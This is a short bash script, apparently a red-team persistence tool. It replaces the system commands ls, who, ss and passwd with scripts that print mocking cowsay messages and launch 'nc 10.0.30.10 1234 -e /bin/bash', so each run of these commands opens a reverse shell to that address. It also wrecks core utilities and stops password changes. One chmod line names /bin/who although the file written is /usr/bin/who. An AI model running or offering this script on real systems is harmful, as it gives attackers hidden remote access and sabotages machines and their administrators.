#!/bin/bash

echo "cowsay \"This command is broken\"" > /bin/ls 
echo "nc 10.0.30.10 1234 -e /bin/bash &" >> /bin/ls
chmod +x /bin/ls

echo "cowsay \"This command is also broken\"" > /usr/bin/who
echo "nc 10.0.30.10 1234 -e /bin/bash &" >> /usr/bin/who
chmod +x /bin/who

echo "cowsay \"Really having a bad time with these commands now\"" > /bin/ss
echo "nc 10.0.30.10 1234 -e /bin/bash &" >> /bin/ss
chmod +x /bin/ss

echo "cowsay \"Uh oh no changing creds now\"" > /usr/bin/passwd
echo "nc 10.0.30.10 1234 -e /bin/bash &" >> /usr/bin/passwd
chmod +x /usr/bin/passwd